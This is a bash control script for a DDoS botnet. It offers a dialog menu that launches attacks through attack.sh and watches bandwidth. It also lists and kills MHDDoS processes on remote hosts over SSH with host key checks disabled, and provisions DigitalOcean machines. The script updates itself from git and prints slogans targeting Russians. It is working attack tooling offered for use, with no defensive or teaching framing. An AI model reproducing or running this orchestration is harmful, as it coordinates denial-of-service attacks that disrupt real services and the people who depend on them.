#!/bin/bash

SCRIPT_DIR=$(dirname "$0")
export SCRIPT_DIR

cd $SCRIPT_DIR
git fetch

[[ -n $(git log ..origin/master) ]] && {
    echo "Found a new version of me, updating myself..."
    git checkout master
    git pull --force
    echo "Running the new version..."
    exec "$SCRIPT_DIR/botnet.sh"

    # Now exit this old instance
    exit 0
}
echo "Already the latest version."


if [ -s "$SCRIPT_DIR/username.txt" ]; then
    USER=$(<"$SCRIPT_DIR/username.txt")
    export USER
else
  export USER='root'
fi

touch -a "$SCRIPT_DIR/hosts.txt"
export DIALOGRC="$SCRIPT_DIR/.dialogrc"

while : ; do
    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Before the start populate your hosts.txt file!" 20 65 9  \
    1 'Botnet attack on host' 2 'Bandwidth monitoring' 3 'Show current attacks' 4 'Stop all botnet attacks' \
    5 'Stop certain host/ip attack in botnet' 6 'Setup SSH hosts' 7 'Change default SSH user' 8 'Cloud providers' 9 'Exit')

    case $MENU_OPTION in

    1) #Botnet attack on host
        bash "$SCRIPT_DIR/attack.sh"
        continue
        ;;

    2) #Bandwidth monitoring
        count=0
        while read -r host
        do
          options+=($((++count)) "$host")
        done < "$SCRIPT_DIR/hosts.txt"

        MENU_OPTION=$(dialog --title 'Bandwidth monitoring' --menu --stdout "Choose host to monitor:" 15 55 ${#options[@]} "${options[@]}")
        HOST=${options[$MENU_OPTION*2-1]}

        (echo -e "DSTAT" && cat) | ssh -t -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$HOST" 'python3 ~/MHDDoS/start.py TOOLS'
        break
        ;;

    3) #Show current attacks
        echo "Loading..."
        printf '' > "$SCRIPT_DIR/output.txt"
        while read -r host
        do
             printf "%s\n%s\n\n" "$host" "$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "$USER@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')" >> "$SCRIPT_DIR/output.txt" &
        done < "$SCRIPT_DIR/hosts.txt"
        wait
        dialog --title 'Hosts and their active attacks' --editbox "$SCRIPT_DIR/output.txt" --stdout 35 70

        continue
        ;;

    4) #Stop all botnet attacks
        bash "$SCRIPT_DIR/rpce.sh" "killall screen"
        dialog --title "Ok" --msgbox "Attacks was killed!\nAnd russians should be!" 6 50
        continue
        ;;


    5) #Stop certain host/ip attack in botnet
        clear
        target=$(bash "${SCRIPT_DIR}/menus/url.sh")
        if [ -n "$target" ]; then
            bash "$SCRIPT_DIR/rpce.sh" "pkill -f $target"
            dialog --title "Ok" --msgbox "Attacks was killed!\nAnd russians should be!" 6 50
        fi

        continue
        ;;

    6) #Setup SSH hosts
        bash "$SCRIPT_DIR/setup_hosts.sh"
        continue
        ;;

    7) #Change default username
        USER=$(bash "$SCRIPT_DIR/menus/username.sh")
        echo "$USER" > "$SCRIPT_DIR/username.txt"
        export USER

        continue
        ;;

    8)
        MENU_OPTION=$(dialog --title 'Cloud providers' --menu --stdout "Choose option:" 15 55 2 1 'Digital Ocean' 2 'Back')
        case $MENU_OPTION in

            1)
                bash "$SCRIPT_DIR/cloud_providers/digital_ocean.sh"
                continue
                ;;
            2)
                continue
                ;;

        esac

        break
        ;;

    *)
        break
        ;;

    esac
done

printf "\nInvaders must die! Slava Ukraini!\n"

